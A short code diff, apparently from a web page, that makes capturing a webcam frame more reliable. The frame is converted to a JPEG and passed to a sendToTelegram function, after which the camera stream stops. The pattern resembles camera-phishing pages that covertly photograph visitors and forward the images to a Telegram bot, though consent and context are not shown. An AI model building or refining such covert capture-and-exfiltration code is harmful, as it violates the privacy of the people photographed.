@@ -57,17 +57,28 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
 
-                // Gambar dari video ke canvas
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Gunakan requestAnimationFrame untuk memastikan video ter-render dengan benar
+                function drawVideoToCanvas() {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Ambil gambar sebagai Blob (bukan base64)
-                canvas.toBlob(function(blob) {
-                    // Kirim gambar ke Telegram
-                    sendToTelegram(blob);
+                    // Cek apakah gambar sudah diambil
+                    if (canvas.width > 0 && canvas.height > 0) {
+                        // Ambil gambar sebagai Blob (bukan base64)
+                        canvas.toBlob(function(blob) {
+                            // Kirim gambar ke Telegram
+                            sendToTelegram(blob);
 
-                    // Stop stream setelah gambar diambil
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
+                            // Stop stream setelah gambar diambil
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/jpeg');
+                    } else {
+                        // Jika belum, coba lagi
+                        requestAnimationFrame(drawVideoToCanvas);
+                    }
+                }
+
+                // Mulai menggambar video ke canvas
+                drawVideoToCanvas();
             };
         }
 
